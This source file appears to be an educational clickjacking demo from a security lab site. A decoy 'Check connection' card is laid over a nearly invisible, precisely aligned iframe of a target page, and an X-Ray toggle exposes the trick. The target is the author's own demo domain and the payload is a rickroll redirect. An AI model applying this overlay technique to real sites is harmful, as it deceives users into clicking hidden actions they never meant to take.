"use client";

import Link from "next/link";
import { useEffect, useRef, useState } from "react";

const targetOrigins = new Set([
  "https://clickjacking-poc.andrewvirya.me",
  "http://localhost:3001",
]);

const rickrollUrl = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
const decoyCardBaseHeight = 420;

type FrameRect = {
  x: number;
  y: number;
  width: number;
  height: number;
};

type FrameLayout = {
  cardRect: FrameRect;
  buttonRect: FrameRect;
  viewportWidth: number;
  viewportHeight: number;
};

function isRecord(value: unknown): value is Record<string, unknown> {
  return typeof value === "object" && value !== null;
}

function isFrameRect(value: unknown): value is FrameRect {
  if (!isRecord(value)) {
    return false;
  }

  return (
    typeof value.x === "number" &&
    Number.isFinite(value.x) &&
    typeof value.y === "number" &&
    Number.isFinite(value.y) &&
    typeof value.width === "number" &&
    Number.isFinite(value.width) &&
    value.width > 0 &&
    typeof value.height === "number" &&
    Number.isFinite(value.height) &&
    value.height > 0
  );
}

function isFrameLayout(value: unknown): value is FrameLayout {
  if (!isRecord(value)) {
    return false;
  }

  return (
    isFrameRect(value.cardRect) &&
    isFrameRect(value.buttonRect) &&
    typeof value.viewportWidth === "number" &&
    Number.isFinite(value.viewportWidth) &&
    value.viewportWidth > 0 &&
    typeof value.viewportHeight === "number" &&
    Number.isFinite(value.viewportHeight) &&
    value.viewportHeight > 0
  );
}

export default function ClickjackingDemo() {
  const iframeRef = useRef<HTMLIFrameElement>(null);
  const stageRef = useRef<HTMLElement>(null);
  const [xRayMode, setXRayMode] = useState(false);
  const [layout, setLayout] = useState<FrameLayout | null>(null);
  const targetUrl =
    process.env.NEXT_PUBLIC_CLICKJACK_TARGET_URL ||
    "https://clickjacking-poc.andrewvirya.me";

  useEffect(() => {
    function handleMessage(event: MessageEvent<unknown>) {
      if (
        !targetOrigins.has(event.origin) ||
        event.source !== iframeRef.current?.contentWindow ||
        !isRecord(event.data) ||
        typeof event.data.type !== "string"
      ) {
        return;
      }

      if (event.data.type === "CLICKJACK_TRIGGERED") {
        window.location.assign(rickrollUrl);
        return;
      }

      if (
        event.data.type !== "CLICKJACK_LAYOUT" ||
        !isFrameLayout(event.data)
      ) {
        return;
      }

      const stage = stageRef.current;
      if (!stage) {
        return;
      }

      const { cardRect, buttonRect, viewportWidth, viewportHeight } =
        event.data;
      const stageWidth = stage.clientWidth;
      const stageHeight = stage.clientHeight;

      if (
        Math.abs(viewportWidth - stageWidth) > 2 ||
        Math.abs(viewportHeight - stageHeight) > 2 ||
        buttonRect.x < 0 ||
        buttonRect.y < 0 ||
        buttonRect.x + buttonRect.width > stageWidth ||
        buttonRect.y + buttonRect.height > stageHeight ||
        buttonRect.x < cardRect.x ||
        buttonRect.y < cardRect.y ||
        buttonRect.x + buttonRect.width > cardRect.x + cardRect.width ||
        buttonRect.y + buttonRect.height > cardRect.y + cardRect.height
      ) {
        setLayout(null);
        return;
      }

      setLayout(event.data);
    }

    window.addEventListener("message", handleMessage);
    return () => window.removeEventListener("message", handleMessage);
  }, []);

  const cardTop = layout ? Math.max(0, layout.viewportHeight / 2 - 150) : null;
  const cardHeight =
    layout && cardTop !== null
      ? Math.max(
          decoyCardBaseHeight,
          layout.buttonRect.y -
            cardTop +
            layout.buttonRect.height +
            32,
        )
      : decoyCardBaseHeight;
  const cardStyle =
    layout && cardTop !== null
      ? {
          top: cardTop,
          width: layout.cardRect.width,
          height: cardHeight,
        }
      : undefined;
  const decoyButtonStyle =
    layout && cardTop !== null
      ? {
          left:
            layout.buttonRect.x -
            (layout.viewportWidth - layout.cardRect.width) / 2 -
            1,
          top: layout.buttonRect.y - cardTop - 1,
          width: layout.buttonRect.width,
          height: layout.buttonRect.height,
          marginTop: 0,
        }
      : undefined;
  const iframeClipPath = layout
    ? `inset(${layout.buttonRect.y}px ${
        layout.viewportWidth - layout.buttonRect.x - layout.buttonRect.width
      }px ${
        layout.viewportHeight - layout.buttonRect.y - layout.buttonRect.height
      }px ${layout.buttonRect.x}px)`
    : xRayMode
      ? "inset(0)"
      : "inset(100%)";

  return (
    <main className="min-h-svh text-[#202124]">
      <header className="relative z-10 flex min-h-15 items-center gap-5 border-b border-[#d9dcdf] bg-white px-6 py-2 max-[700px]:flex-wrap max-[700px]:gap-x-4 max-[700px]:gap-y-1 max-[700px]:px-4">
        <Link
          className="inline-flex min-h-10 shrink-0 items-center gap-2 text-[#202124] no-underline hover:underline hover:underline-offset-[3px] focus-visible:outline-2 focus-visible:outline-offset-[3px] focus-visible:outline-[#1a73e8]"
          href="/labs/clickjacking/clickjacking-poc"
        >
          <span aria-hidden="true">←</span>
          Back to lab
        </Link>
        <p className="m-0 flex-1 text-[14px] leading-[1.4] text-[#4b5055] max-[700px]:order-2 max-[700px]:basis-full max-[700px]:text-[13px]">
          Educational simulation — UI redressing demo
        </p>
        <label className="inline-flex min-h-10 shrink-0 cursor-pointer items-center gap-2 text-sm text-[#202124] max-[700px]:ml-auto">
          <input
            checked={xRayMode}
            onChange={(event) => setXRayMode(event.target.checked)}
            className="m-0 size-4 accent-[#3c4043] focus-visible:outline-2 focus-visible:outline-offset-[3px] focus-visible:outline-[#1a73e8]"
            type="checkbox"
          />
          <span>X-Ray Mode</span>
        </label>
      </header>

      <section
        aria-label="Clickjacking demonstration"
        className="relative h-[calc(100svh-60px)] min-h-105 w-full overflow-hidden bg-[#f5f6f7] max-[700px]:h-[calc(100svh-88px)]"
        ref={stageRef}
      >
        <article
          className="absolute left-1/2 top-[calc(50%-150px)] min-h-105 w-140 max-w-[calc(100%-32px)] -translate-x-1/2 rounded-lg border border-[#d9dcdf] bg-white px-10 py-9 max-[700px]:px-6 max-[700px]:py-7.5"
          style={cardStyle}
        >
          <p className="mb-6 mt-0 text-[13px] text-[#5f6368]">
            Connection status
          </p>
          <h1 className="m-0 text-[25px] font-normal leading-[1.3] max-[700px]:text-[23px]">
            Quick Connection Check
          </h1>
          <p className="mb-0 mt-4 max-w-105 text-sm leading-[1.6] text-[#3c4043]">
            Confirm that your display connection is active.
          </p>
          <button
            className={`absolute left-1/2 top-85 z-1 flex min-h-11.5 min-w-52.5 cursor-pointer items-center justify-center rounded bg-[#1a73e8] px-6 text-sm font-semibold text-white hover:bg-[#1765cc] focus-visible:outline-2 focus-visible:outline-offset-[3px] focus-visible:outline-[#1a73e8] ${
              layout ? "" : "-translate-x-1/2"
            }`}
            onClick={() => window.location.assign(rickrollUrl)}
            style={decoyButtonStyle}
            type="button"
          >
            Check connection
          </button>
        </article>

        <iframe
          aria-label="Overlaid educational clickjacking target"
          className="absolute inset-0 z-2 h-full w-full border-0 bg-transparent"
          ref={iframeRef}
          sandbox="allow-scripts allow-same-origin"
          src={targetUrl}
          style={{
            clipPath: iframeClipPath,
            opacity: xRayMode ? 0.35 : 0.01,
            WebkitClipPath: iframeClipPath,
          }}
          title="Clickjacking demonstration target"
        />
      </section>
    </main>
  );
}
